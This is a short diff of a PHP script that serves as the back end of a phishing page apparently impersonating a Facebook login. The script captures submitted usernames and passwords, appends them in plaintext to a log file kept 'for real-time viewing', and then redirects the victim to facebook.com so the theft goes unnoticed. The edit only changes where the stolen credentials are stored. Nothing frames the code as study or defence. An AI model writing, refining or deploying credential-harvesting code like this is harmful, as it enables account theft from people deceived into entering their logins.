@@ -4,20 +4,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'] ?? '';
     $entry = "Username: " . $username . " | Password: " . $password . "\n";
 
-    $dir = "/storage/emulated/0/Login txt/";
-    $file = $dir . "login.txt";
-
-    // Also log to project directory (for real-time viewing)
+    // Log file in project directory
     $liveLog = "live_login.log";
 
-    // Create directory if it doesn't exist
-    if (!is_dir($dir)) {
-        mkdir($dir, 0777, true);
-    }
-
-    file_put_contents($file, $entry, FILE_APPEND);
+    // Save entry to live_login.log
     file_put_contents($liveLog, date("Y-m-d H:i:s") . " - " . $entry, FILE_APPEND);
 
+    // Redirect user to Facebook
     header("Location: https://www.facebook.com");
     exit();
 }
